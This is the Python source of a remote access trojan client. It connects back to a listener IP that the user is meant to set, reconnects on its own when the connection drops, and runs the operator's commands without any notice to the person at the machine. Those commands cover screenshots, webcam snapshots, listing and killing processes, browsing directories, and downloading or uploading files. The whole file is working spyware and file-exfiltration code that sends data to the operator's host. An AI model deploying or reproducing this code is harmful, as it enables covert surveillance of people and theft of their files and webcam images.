import socket, os, platform, json, io, base64, psutil, cv2, threading, time
from PIL import ImageGrab

SERVER_IP = "192.168.254.12"  # change to your listener IP
SERVER_PORT = 5000

MAGIC_START = b"<<<<START>>>>"
MAGIC_END = b"<<<<END>>>>"
MAGIC_STOP = b"<<<<STOP>>>>"

# === PROTOCOL ===
def send_json(sock, data):
    raw = json.dumps(data).encode()
    header = MAGIC_START + str(len(raw)).encode() + MAGIC_END
    sock.sendall(header + raw + MAGIC_STOP)

def recv_until(sock, marker):
    buf = b""
    while marker not in buf:
        chunk = sock.recv(1)
        if not chunk:
            raise ConnectionError("Socket closed")
        buf += chunk
    before, after = buf.split(marker, 1)
    return before, after

def recv_json(sock):
    # find START
    _, buf = recv_until(sock, MAGIC_START)
    # find END to get length
    len_str, buf = recv_until(sock, MAGIC_END)
    length = int(len_str.decode())
    # read JSON body
    while len(buf) < length + len(MAGIC_STOP):
        buf += sock.recv(length + len(MAGIC_STOP) - len(buf))
    json_body = buf[:length]
    stop_marker = buf[length:length+len(MAGIC_STOP)]
    if stop_marker != MAGIC_STOP:
        raise ValueError("Protocol mismatch STOP missing!")
    return json.loads(json_body.decode())

# === FEATURES ===
def capture_screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="JPEG")
    return base64.b64encode(buf.getvalue()).decode()

def capture_webcam():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened(): return None
    ret, frame = cap.read()
    cap.release()
    if not ret: return None
    _, buf = cv2.imencode(".jpg", frame)
    return base64.b64encode(buf).decode()

def list_tasks():
    return [{"pid": p.pid, "name": p.name()} for p in psutil.process_iter()]

def kill_task(pid):
    try:
        psutil.Process(pid).terminate()
        return True
    except:
        return False

def list_files(path):
    try:
        return [{"name": f, "is_dir": os.path.isdir(os.path.join(path, f))} for f in os.listdir(path)]
    except:
        return []

def send_file(path):
    with open(path, "rb") as f:
        return base64.b64encode(f.read()).decode()

def save_file(path, b64data):
    with open(path, "wb") as f:
        f.write(base64.b64decode(b64data))
    return True

# === COMMAND HANDLER ===
def handle_command(cmd):
    act = cmd.get("action")
    if act == "screenshot": return {"img": capture_screenshot()}
    if act == "webcam":
        img = capture_webcam()
        return {"img": img if img else "NO_CAM"}
    if act == "list_tasks": return {"tasks": list_tasks()}
    if act == "kill_task": return {"ok": kill_task(cmd["pid"])}
    if act == "list_files": return {"files": list_files(cmd["path"])}
    if act == "download_file": return {"data": send_file(cmd["path"])}
    if act == "upload_file": return {"ok": save_file(cmd["path"], cmd["data"])}
    return {"error": "UNKNOWN_COMMAND"}

# === MAIN LOOP ===
def client_loop():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            send_json(sock, {"action": "info", "hostname": platform.node(), "os": platform.system()})
            while True:
                cmd = recv_json(sock)
                if not cmd: break
                resp = handle_command(cmd)
                send_json(sock, resp)
        except Exception as e:
            print("Reconnecting in 2s:", e)
            time.sleep(2)

if __name__ == "__main__":
    client_loop()
